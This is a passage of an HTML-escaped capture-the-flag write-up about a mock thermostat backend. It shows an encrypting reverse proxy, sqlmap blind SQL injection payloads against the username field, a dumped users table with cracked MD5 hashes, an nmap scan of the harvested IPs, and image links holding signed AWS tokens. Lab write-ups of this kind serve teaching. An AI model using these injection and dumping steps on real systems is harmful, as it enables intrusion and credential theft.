class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eencoders\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eencoders\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003ewrap\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ewrapped\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eCryptingReverseProxy\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eproxy\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eReverseProxyResource\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nb\"\u003eobject\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n            \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003e__init__\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ewrapped_self\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ebackend\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n                \u003cspan class=\"nb\"\u003esuper\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eCryptingReverseProxy\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ewrapped_self\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003e__init__\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ebackend\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ehost\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ebackend\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eport\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ebackend\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ebackend\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereactor\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n            \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003egetChild\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ewrapped_self\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n                \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ewrap\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003esuper\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eCryptingReverseProxy\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ewrapped_self\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003egetChild\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eEncodingResourceWrapper\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eCryptingReverseProxy\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ewrapped\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eencoders\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003ebackend\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eproxy\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eReverseProxyResource\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;35.243.186.41\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003ewrapper\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eEncoderFactoryFactory\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"n\"\u003eCryptEncoderFactory\u003c/span\u003e\u003cspan class=\"p\"\u003e()])\u003c/span\u003e\n\u003cspan class=\"n\"\u003esite\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eSite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ewrapper\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ewrap\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ebackend\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003cspan class=\"n\"\u003ereactor\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003elistenTCP\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e8001\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esite\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003ereactor\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erun\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe implementation is not very clean, but it is very fast. Anyways let\u0026#39;s test our endpoint!\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ curl \u0026quot;http://localhost:8001\u0026quot; -X POST --data \u0026quot;username=admin\u0026amp;password=lol123\u0026amp;cmd=getTemp\u0026quot;\n\u0026quot;success\u0026quot;: false, \u0026quot;error\u0026quot;: \u0026quot;Invalid username or password\u0026quot;}\n$ curl \u0026quot;http://localhost:8001\u0026quot; -X POST --data \u0026quot;username=admin\u0026amp;password=password\u0026amp;cmd=getTemp\u0026quot;\n{\u0026quot;temperature\u0026quot;: 73, \u0026quot;success\u0026quot;: true}\n$ curl \u0026quot;http://localhost:8001\u0026quot; -X POST --data \u0026quot;username=admin\u0026amp;password=password\u0026amp;cmd=getTempp\u0026quot;\n{\u0026quot;success\u0026quot;: false, \u0026quot;error\u0026quot;: \u0026quot;Unknown command\u0026quot;}\n$ curl \u0026quot;http://localhost:8001\u0026quot; -X POST --data \u0026quot;username=admin\u0026amp;password=password\u0026amp;cmd=setTemp\u0026quot;\n{\u0026quot;success\u0026quot;: false, \u0026quot;error\u0026quot;: \u0026quot;Missing temperature\u0026quot;}\n$ curl \u0026quot;http://localhost:8001\u0026quot; -X POST --data \u0026quot;username=admin\u0026amp;password=password\u0026amp;cmd=setTemp\u0026amp;temp=50\u0026quot;\n{\u0026quot;success\u0026quot;: true}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLOL nice password. Let\u0026#39;s check for SQL injection.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ python sqlmap.py -u \u0026quot;http://localhost:8001\u0026quot; --method=POST --data=\u0026quot;username=admin\u0026amp;password=admin\u0026amp;cmd=setTemp\u0026amp;temp=50\u0026quot; --level 5 --risk 3\n        ___\n       __H__\n ___ ___[\u0026quot;]_____ ___ ___  {1.3.2.31#dev}\n|_ -| . [\u0026#39;]     | .\u0026#39;| . |\n|___|_  [\u0026#39;]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 23:24:00 /2019-03-12/\n\n[23:24:18] [INFO] POST parameter \u0026#39;username\u0026#39; appears to be \u0026#39;AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\u0026#39; injectable\n[23:24:40] [INFO] POST parameter \u0026#39;username\u0026#39; appears to be \u0026#39;MySQL \u0026gt;= 5.0.12 AND time-based blind\u0026#39; injectable\n[23:24:19] [INFO] heuristic (extended) test shows that the back-end DBMS could be \u0026#39;MySQL\u0026#39;\nit looks like the back-end DBMS is \u0026#39;MySQL\u0026#39;. Do you want to skip test payloads specific for other DBMSes? [Y/n]\nPOST parameter \u0026#39;username\u0026#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N]\nsqlmap identified the following injection point(s) with a total of 772 HTTP(s) requests:\n---\nParameter: username (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: username=admin\u0026#39; AND 6107=(SELECT (CASE WHEN (6107=6107) THEN 6107 ELSE (SELECT 4219 UNION SELECT 9192) END))-- ZaDb\u0026amp;password=admin\u0026amp;cmd=setTemp\u0026amp;temp=50\n\n    Type: AND/OR time-based blind\n    Title: MySQL \u0026gt;= 5.0.12 AND time-based blind\n    Payload: username=admin\u0026#39; AND SLEEP(5)-- rYre\u0026amp;password=admin\u0026amp;cmd=setTemp\u0026amp;temp=50\n---\n[23:25:11] [INFO] the back-end DBMS is MySQL\nweb application technology: Nginx 1.15.8\nback-end DBMS: MySQL \u0026gt;= 5.0.12\n[23:25:11] [INFO] fetched data logged to text files under \u0026#39;/root/.sqlmap/output/localhost\u0026#39;\n\n[*] ending @ 23:25:11 /2019-03-12/\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNice. Let\u0026#39;s dump everything!\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ python sqlmap.py -u \u0026quot;http://localhost:8001\u0026quot; --method=POST --data=\u0026quot;username=admin\u0026amp;password=admin\u0026amp;cmd=setTemp\u0026amp;temp=50\u0026quot; --dump --threads 5\nDatabase: flitebackend\nTable: users\n[2 entries]\n+----+----------+---------------------------------------------+\n| id | username | password                                    |\n+----+----------+---------------------------------------------+\n| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |\n| 2  | sevenate | c5b1d550b588178c4bb321069fb688ab (nine10)   |\n+----+----------+---------------------------------------------+\n\nDatabase: flitebackend\nTable: devices\n[151 entries]\n+-----+-----------------+\n| id  | ip              |\n+-----+-----------------+\n| 1   | 251.11.33.68    |\n| 2   | 10.143.156.45   |\n       --- snip ---\n| 150 | 192.88.99.145   |\n| 151 | 192.88.99.104   |\n+-----+-----------------+\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNotice the weak hashes. We also see a table \u003ccode\u003edevices\u003c/code\u003e which apparently is just a list of IP addresses.\u003cbr\u003e\nHowever, looking at the list the majority of them seem to be either in private ranges or not routed.\u003cbr\u003e\nTo clean up this list, I used a nmap ping scan.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ stdbuf -oL nmap -sn -vvv -iL hosts.txt | tee scan.txt\nStarting Nmap 7.40 ( https://nmap.org ) at 2019-03-17 10:38 EST\nInitiating Ping Scan at 20:08\nScanning 104.196.12.98 [4 ports]\nCompleted Ping Scan at 20:08, 0.22s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 20:08\nCompleted Parallel DNS resolution of 1 host. at 20:08, 0.02s elapsed\nDNS resolution of 1 IPs took 0.02s. Mode: Async [#: 2, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]\nInitiating SYN Stealth Scan at 20:08\nScanning 98.12.196.104.bc.googleusercontent.com (104.196.12.98) [1 port]\nDiscovered open port 80/tcp on 104.196.12.98\nCompleted SYN Stealth Scan at 20:08, 0.22s elapsed (1 total ports)\nNmap scan report for 98.12.196.104.bc.googleusercontent.com (104.196.12.98)\nHost is up, received reset ttl 55 (0.038s latency).\nScanned at 2019-03-17 10:38:23 EST for 1s\nPORT   STATE SERVICE REASON\n80/tcp open  http    syn-ack ttl 55\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.57 seconds\n           Raw packets sent: 5 (196B) | Rcvd: 7 (542B)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eReally? Only 1 host is up, and it has http server? This must be the path forwards.\u003c/p\u003e\n\n\u003ch3 id=\"0x02-flitethermostat-part-i\"\u003e(0x02) FliteThermostat, part I\u003c/h3\u003e\n\n\u003cp\u003eWe are first greeted by what appears to be a login page.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"flite0.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/494/fa311e81b8ed59aa29b8395a57deb5bf8a4bc762/flite0.png?response-content-disposition=attachment%3B%20filename%3D%22flite0.png%22%3B%20filename%2A%3DUTF-8%27%27flite0.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=be815336bcd38b9e79b6a12a317e38e3d146487d1d5f7df079e7a7e868f9464a\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/494/fa311e81b8ed59aa29b8395a57deb5bf8a4bc762/flite0.png?response-content-disposition=attachment%3B%20filename%3D%22flite0.png%22%3B%20filename%2A%3DUTF-8%27%27flite0.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=be815336bcd38b9e79b6a12a317e38e3d146487d1d5f7df079e7a7e868f9464a\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eLooking at the webpage\u0026#39;s source code, we see the bulk of the functionality is implemented in \u003ccode\u003elogin.js\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003estream\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eb\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[];\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e256\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ej\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e256\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ej\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ej\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003echarCodeAt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"mh\"\u003e0xFF\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ej\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ej\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003estream\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eprototype\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003enext\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan 